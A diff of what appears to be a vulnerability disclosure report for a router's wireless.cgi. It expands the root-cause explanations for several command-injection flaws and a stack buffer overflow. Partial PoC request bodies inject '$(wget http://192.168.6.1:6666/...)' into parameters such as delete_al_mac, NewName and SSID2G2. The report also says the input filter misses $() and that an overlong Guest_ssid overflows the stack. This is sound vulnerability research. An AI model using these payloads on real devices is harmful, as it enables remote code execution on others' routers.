@@ -70,26 +70,24 @@ page=GuestWifi&guestEn=1&Authentication_Mode=2&Guest_password=$(wget http://192.
 **Class:** Command Injection (CWE-78)
 
 **Root Cause:**
-The vulnerability exists in the DeleteMac handler function `sub_402D1C`. When `page=DeleteMac`, the main router dispatches to this function.
+The vulnerability exists in the DeleteMac handler function `sub_402D1C` of `/cgi-bin/wireless.cgi`. When the HTTP POST parameter `page` is set to `DeleteMac`, the main routing function `ftext` dispatches execution to `sub_402D1C`.
 
-The function reads four POST parameters via `sub_405EA8`:
+The function reads four POST parameters via `sub_405EA8` (URL decode function):
 - `delete_list` → variable `v4`
 - `delete_al_mac` → variable `v6`
 - `b_delete_list` → variable `v8`
 - `b_delete_al_mac` → variable `v10`
 
-These are concatenated into a shell command using sprintf:
+These four parameters are concatenated into a shell command using sprintf:
 
 ```c
 sprintf(v20, "/etc/lighttpd/www/cgi-bin/del_mac.sh y%s y%s y%s y%s &", v4, v6, v8, v10);
-sub_405314(v20);  // sub_405314 calls system()
+sub_405314(v20);
 ```
 
-The resulting command is: `/etc/lighttpd/www/cgi-bin/del_mac.sh y<delete_list> y<delete_al_mac> y<b_delete_list> y<b_delete_al_mac> &`
+The function `sub_405314` is a wrapper that calls `system()` to execute the constructed command. The resulting command is: `/etc/lighttpd/www/cgi-bin/del_mac.sh y<delete_list> y<delete_al_mac> y<b_delete_list> y<b_delete_al_mac> &`
 
-The `delete_al_mac` parameter (variable `v6`, 2nd argument) is passed directly to the shell command without any sanitization. Since the shell interprets `$()` before executing the command, an attacker can inject arbitrary commands.
-
-**No input filter is applied** to the DeleteMac parameters — unlike the GuestWifi handler which calls `sub_4074A0`, the DeleteMac handler does NOT call any filter function.
+The `delete_al_mac` parameter (variable `v6`, 2nd argument in the sprintf call) is passed directly to the shell command without any sanitization. No input filter function (`sub_4074A0`) is called in the DeleteMac handler, unlike the GuestWifi handler. Since the shell interprets `$()` command substitution before executing the command, an attacker can inject arbitrary commands by placing `$(command)` in the `delete_al_mac` parameter.
 
 **PoC:**
 ```http
@@ -112,14 +110,24 @@ page=DeleteMac&delete_list=AA&delete_al_mac=$(wget http://192.168.6.1:6666/del_a
 **Class:** Command Injection (CWE-78)
 
 **Root Cause:**
-Same vulnerability as #2, but through the `b_delete_list` parameter (variable `v8`, 3rd argument in the sprintf call).
+The vulnerability exists in the DeleteMac handler function `sub_402D1C` of `/cgi-bin/wireless.cgi`. When the HTTP POST parameter `page` is set to `DeleteMac`, the main routing function `ftext` dispatches execution to `sub_402D1C`.
 
-The sprintf call is:
+The function reads four POST parameters via `sub_405EA8` (URL decode function):
+- `delete_list` → variable `v4`
+- `delete_al_mac` → variable `v6`
+- `b_delete_list` → variable `v8`
+- `b_delete_al_mac` → variable `v10`
+
+These four parameters are concatenated into a shell command using sprintf:
+
 ```c
 sprintf(v20, "/etc/lighttpd/www/cgi-bin/del_mac.sh y%s y%s y%s y%s &", v4, v6, v8, v10);
+sub_405314(v20);
 ```
 
-The `b_delete_list` parameter is the 3rd `%s` placeholder. Since no sanitization is applied, injecting `$(command)` in this parameter also achieves command execution.
+The function `sub_405314` is a wrapper that calls `system()` to execute the constructed command. The resulting command is: `/etc/lighttpd/www/cgi-bin/del_mac.sh y<delete_list> y<delete_al_mac> y<b_delete_list> y<b_delete_al_mac> &`
+
+The `b_delete_list` parameter (variable `v8`, 3rd argument in the sprintf call) is passed directly to the shell command without any sanitization. No input filter function (`sub_4074A0`) is called in the DeleteMac handler. Since the shell interprets `$()` command substitution before executing the command, an attacker can inject arbitrary commands by placing `$(command)` in the `b_delete_list` parameter.
 
 **PoC:**
 ```http
@@ -142,14 +150,24 @@ page=DeleteMac&delete_list=AA&delete_al_mac=BB&b_delete_list=$(wget http://192.1
 **Class:** Command Injection (CWE-78)
 
 **Root Cause:**
-Same vulnerability as #2 and #3, but through the `b_delete_al_mac` parameter (variable `v10`, 4th argument in the sprintf call).
+The vulnerability exists in the DeleteMac handler function `sub_402D1C` of `/cgi-bin/wireless.cgi`. When the HTTP POST parameter `page` is set to `DeleteMac`, the main routing function `ftext` dispatches execution to `sub_402D1C`.
 
-The sprintf call is:
+The function reads four POST parameters via `sub_405EA8` (URL decode function):
+- `delete_list` → variable `v4`
+- `delete_al_mac` → variable `v6`
+- `b_delete_list` → variable `v8`
+- `b_delete_al_mac` → variable `v10`
+
+These four parameters are concatenated into a shell command using sprintf:
+
 ```c
 sprintf(v20, "/etc/lighttpd/www/cgi-bin/del_mac.sh y%s y%s y%s y%s &", v4, v6, v8, v10);
+sub_405314(v20);
 ```
 
-The `b_delete_al_mac` parameter is the 4th `%s` placeholder. Since no sanitization is applied, injecting `$(command)` in this parameter also achieves command execution.
+The function `sub_405314` is a wrapper that calls `system()` to execute the constructed command. The resulting command is: `/etc/lighttpd/www/cgi-bin/del_mac.sh y<delete_list> y<delete_al_mac> y<b_delete_list> y<b_delete_al_mac> &`
+
+The `b_delete_al_mac` parameter (variable `v10`, 4th argument in the sprintf call) is passed directly to the shell command without any sanitization. No input filter function (`sub_4074A0`) is called in the DeleteMac handler. Since the shell interprets `$()` command substitution before executing the command, an attacker can inject arbitrary commands by placing `$(command)` in the `b_delete_al_mac` parameter.
 
 **PoC:**
 ```http
@@ -172,22 +190,22 @@ page=DeleteMac&delete_list=AA&delete_al_mac=BB&b_delete_list=CC&b_delete_al_mac=
 **Class:** Command Injection (CWE-78)
 
 **Root Cause:**
-The vulnerability exists in the SetName handler function `sub_403198`. When `page=SetName`, the main router dispatches to this function.
+The vulnerability exists in the SetName handler function `sub_403198` of `/cgi-bin/wireless.cgi`. When the HTTP POST parameter `page` is set to `SetName`, the main routing function `ftext` dispatches execution to `sub_403198`.
 
-The function reads two POST parameters via `sub_405EA8`:
+The function reads two POST parameters via `sub_405EA8` (URL decode function):
 - `mac_5g` → variable `v4`
 - `NewName` → variable `v7`
 
-These are concatenated into a shell command using sprintf:
+These two parameters are concatenated into a shell command using sprintf:
 
 ```c
 sprintf(v14, "/etc/lighttpd/www/cgi-bin/change_name.sh %s %s &", v4, v7);
-sub_405314(v14);  // sub_405314 calls system()
+sub_405314(v14);
 ```
 
-The resulting command is: `/etc/lighttpd/www/cgi-bin/change_name.sh <mac_5g> <NewName> &`
+The function `sub_405314` is a wrapper that calls `system()` to execute the constructed command. The resulting command is: `/etc/lighttpd/www/cgi-bin/change_name.sh <mac_5g> <NewName> &`
 
-The `NewName` parameter is passed directly to the shell command without any sanitization. **No input filter is applied** — the SetName handler does NOT call `sub_4074A0`.
+The `NewName` parameter (variable `v7`, 2nd argument in the sprintf call) is passed directly to the shell command without any sanitization. No input filter function (`sub_4074A0`) is called in the SetName handler. Since the shell interprets `$()` command substitution before executing the command, an attacker can inject arbitrary commands by placing `$(command)` in the `NewName` parameter.
 
 **PoC:**
 ```http
@@ -210,23 +228,23 @@ page=SetName&mac_5g=AA:BB:CC:DD:EE:FF&NewName=$(wget http://192.168.6.1:6666/new
 **Class:** Command Injection (CWE-78)
 
 **Root Cause:**
-The vulnerability exists in the multi_ssid handler function `sub_401D68`. When `page=multi_ssid`, the main router dispatches to this function.
+The vulnerability exists in the multi_ssid handler function `sub_401D68` of `/cgi-bin/wireless.cgi`. When the HTTP POST parameter `page` is set to `multi_ssid`, the main routing function `ftext` dispatches execution to `sub_401D68`.
 
-The function reads the `SSID2G2` POST parameter via `sub_405EA8` and stores it in variable `v8`. The value is then used in multiple sprintf+system calls:
+The function reads the `SSID2G2` POST parameter via `sub_405EA8` (URL decode function) and stores it in variable `v8`. The decoded value is then used in multiple sprintf+system calls to configure the multi-SSID wireless interface:
 
 ```c
-sprintf(v30, "%s_Touch", v8);  // Append "_Touch" suffix
+sprintf(v30, "%s_Touch", v8);  // Append "_Touch" suffix to SSID
 sprintf(v29, "set_bss.sh set 2 \"%s_Touch\" OPEN NONE Admin12345", v30);
 system(v29);
 sprintf(v29, "set_bss.sh set 6 \"%s_Touch\" OPEN NONE Admin12345", v30);
 system(v29);
 ```
 
-The resulting commands are:
+The function `sub_405314` (called via `system()`) executes the constructed commands. The resulting commands are:
 - `set_bss.sh set 2 "<SSID2G2>_Touch" OPEN NONE Admin12345`
 - `set_bss.sh set 6 "<SSID2G2>_Touch" OPEN NONE Admin12345`
 
-The `SSID2G2` value is embedded in the command string without sanitization. The input filter `sub_4074A0` is called but only blocks backtick and pipe, not `$()`.
+The `SSID2G2` value is embedded in the command string without sanitization. The input filter function `sub_4074A0` is called but only blocks backtick (`` ` ``) and pipe (`|`) characters. The `$(cmd)` command substitution syntax is not filtered, allowing an attacker to inject arbitrary commands.
 
 **PoC:**
 ```http
@@ -249,19 +267,23 @@ page=multi_ssid&wifi_multi_ssid=1&SSID2G2=$(wget http://192.168.6.1:6666/ssid2g2
 **Class:** Command Injection (CWE-78)
 
 **Root Cause:**
-Same handler function `sub_401D68` as vulnerability #6, but through the `SSID5G2` POST parameter.
+The vulnerability exists in the multi_ssid handler function `sub_401D68` of `/cgi-bin/wireless.cgi`. When the HTTP POST parameter `page` is set to `multi_ssid`, the main routing function `ftext` dispatches execution to `sub_401D68`.
 
-The `SSID5G2` value is read via `sub_405EA8` and used in the same sprintf+system pattern:
+The function reads the `SSID5G2` POST parameter via `sub_405EA8` (URL decode function) and stores it in variable `v8`. The decoded value is then used in multiple sprintf+system calls to configure the multi-SSID wireless interface:
 
 ```c
-sprintf(v30, "%s_Touch", v8);  // v8 = SSID5G2
+sprintf(v30, "%s_Touch", v8);  // Append "_Touch" suffix to SSID
 sprintf(v29, "set_bss.sh set 2 \"%s_Touch\" OPEN NONE Admin12345", v30);
 system(v29);
 sprintf(v29, "set_bss.sh set 6 \"%s_Touch\" OPEN NONE Admin12345", v30);
 system(v29);
 ```
 
-The vulnerability is identical to #6 but through a different parameter name.
+The function `sub_405314` (called via `system()`) executes the constructed commands. The resulting commands are:
+- `set_bss.sh set 2 "<SSID5G2>_Touch" OPEN NONE Admin12345`
+- `set_bss.sh set 6 "<SSID5G2>_Touch" OPEN NONE Admin12345`
+
+The `SSID5G2` value is embedded in the command string without sanitization. The input filter function `sub_4074A0` is called but only blocks backtick (`` ` ``) and pipe (`|`) characters. The `$(cmd)` command substitution syntax is not filtered, allowing an attacker to inject arbitrary commands.
 
 **PoC:**
 ```http
@@ -284,16 +306,22 @@ page=multi_ssid&wifi_multi_ssid=1&SSID5G2=$(wget http://192.168.6.1:6666/ssid5g2
 **Class:** Command Injection (CWE-78)
 
 **Root Cause:**
-Same handler function `sub_401D68` as vulnerabilities #6 and #7, but through the `AuthMethod2` POST parameter.
+The vulnerability exists in the multi_ssid handler function `sub_401D68` of `/cgi-bin/wireless.cgi`. When the HTTP POST parameter `page` is set to `multi_ssid`, the main routing function `ftext` dispatches execution to `sub_401D68`.
 
-The `AuthMethod2` value is read via `sub_405EA8` and used in the sprintf+system calls for configuring the authentication method of the multi-SSID interface. The value is embedded in the shell command without sanitization.
+The function reads the `AuthMethod2` POST parameter via `sub_405EA8` (URL decode function) and stores it in a local variable. The decoded value is then used in sprintf+system calls to configure the authentication method of the multi-SSID wireless interface:
 
 ```c
 sprintf(v29, "set_bss.sh set 2 \"%s_Touch\" %s %s Admin12345", v30, v_authmethod, v_encryptype);
 system(v29);
+sprintf(v29, "set_bss.sh set 6 \"%s_Touch\" %s %s Admin12345", v30, v_authmethod, v_encryptype);
+system(v29);
 ```
 
-The `AuthMethod2` parameter replaces the `OPEN` placeholder in the command. Since no sanitization is applied, `$(command)` syntax is executed.
+Where `v_authmethod` is the decoded value of `AuthMethod2`. The function `sub_405314` (called via `system()`) executes the constructed commands. The resulting commands are:
+- `set_bss.sh set 2 "<SSID>_Touch" <AuthMethod2> <EncrypType> Admin12345`
+- `set_bss.sh set 6 "<SSID>_Touch" <AuthMethod2> <EncrypType> Admin12345`
+
+The `AuthMethod2` value replaces the `OPEN` placeholder in the command. The input filter function `sub_4074A0` is called but only blocks backtick (`` ` ``) and pipe (`|`) characters. The `$(cmd)` command substitution syntax is not filtered, allowing an attacker to inject arbitrary commands.
 
 **PoC:**
 ```http
@@ -316,16 +344,22 @@ page=multi_ssid&wifi_multi_ssid=1&SSID2G2=TestSSID&AuthMethod2=$(wget http://192
 **Class:** Command Injection (CWE-78)
 
 **Root Cause:**
-Same handler function `sub_401D68` as vulnerabilities #6-8, but through the `WPAPSK12` POST parameter.
+The vulnerability exists in the multi_ssid handler function `sub_401D68` of `/cgi-bin/wireless.cgi`. When the HTTP POST parameter `page` is set to `multi_ssid`, the main routing function `ftext` dispatches execution to `sub_401D68`.
 
-The `WPAPSK12` value is read via `sub_405EA8` and used in the sprintf+system calls for setting the WPA pre-shared key:
+The function reads the `WPAPSK12` POST parameter via `sub_405EA8` (URL decode function) and stores it in a local variable. The decoded value is then used in sprintf+system calls to configure the WPA pre-shared key of the multi-SSID wireless interface:
 
 ```c
 sprintf(v29, "set_bss.sh set 2 \"%s_Touch\" %s %s %s", v30, v_authmethod, v_encryptype, v_wpapsk);
 system(v29);
+sprintf(v29, "set_bss.sh set 6 \"%s_Touch\" %s %s %s", v30, v_authmethod, v_encryptype, v_wpapsk);
+system(v29);
 ```
 
-The `WPAPSK12` parameter is the WPA key value in the command. Since no sanitization is applied, `$(command)` syntax is executed.
+Where `v_wpapsk` is the decoded value of `WPAPSK12`. The function `sub_405314` (called via `system()`) executes the constructed commands. The resulting commands are:
+- `set_bss.sh set 2 "<SSID>_Touch" <AuthMethod> <EncrypType> <WPAPSK12>`
+- `set_bss.sh set 6 "<SSID>_Touch" <AuthMethod> <EncrypType> <WPAPSK12>`
+
+The `WPAPSK12` value is the WPA pre-shared key in the command. The input filter function `sub_4074A0` is called but only blocks backtick (`` ` ``) and pipe (`|`) characters. The `$(cmd)` command substitution syntax is not filtered, allowing an attacker to inject arbitrary commands.
 
 **PoC:**
 ```http
@@ -348,9 +382,9 @@ page=multi_ssid&wifi_multi_ssid=1&SSID2G2=TestSSID&AuthMethod2=WPA2PSK&EncrypTyp
 **Class:** Buffer Overflow (CWE-120)
 
 **Root Cause:**
-The vulnerability exists in the `sub_407504` function (iwpriv_cmd) which is called by the GuestWifi handler `sub_4032E4`.
+The vulnerability exists in the `sub_407504` function (iwpriv_cmd) of `/cgi-bin/wireless.cgi`, which is called by the GuestWifi handler function `sub_4032E4`.
 
-The function allocates a 1028-byte stack buffer and uses sprintf to construct a shell command without bounds checking:
+The function `sub_407504` allocates a 1028-byte stack buffer and uses sprintf to construct a shell command without bounds checking:
 
 ```c
 int sub_407504(const char *a1, const char *a2, const char *a3) {
@@ -364,7 +398,7 @@ int sub_407504(const char *a1, const char *a2, const char *a3) {
 
 The format string `"iwpriv %s set %s=\"%s\""` is 22 characters (including quotes and null terminator). When `strlen(a1) + strlen(a2) + strlen(a3) + 22 > 1028`, the sprintf overflows the stack buffer `v8`.
 
-In the GuestWifi handler `sub_4032E4`, the `Guest_ssid` POST parameter (variable `v15`) is passed as `a3` to `sub_407504("rai0", "SSID", v15)`. The `a1` parameter is "rai0" (4 bytes) and `a2` is "SSID" (4 bytes).
+In the GuestWifi handler `sub_4032E4`, the `Guest_ssid` POST parameter (variable `v15`) is read via `sub_405EA8` and passed as `a3` to `sub_407504("rai0", "SSID", v15)`. The `a1` parameter is "rai0" (4 bytes) and `a2` is "SSID" (4 bytes).
 
 The total overflow threshold is: `4 + 4 + strlen(Guest_ssid) + 22 > 1028`, which means `strlen(Guest_ssid) > 998` bytes.
 
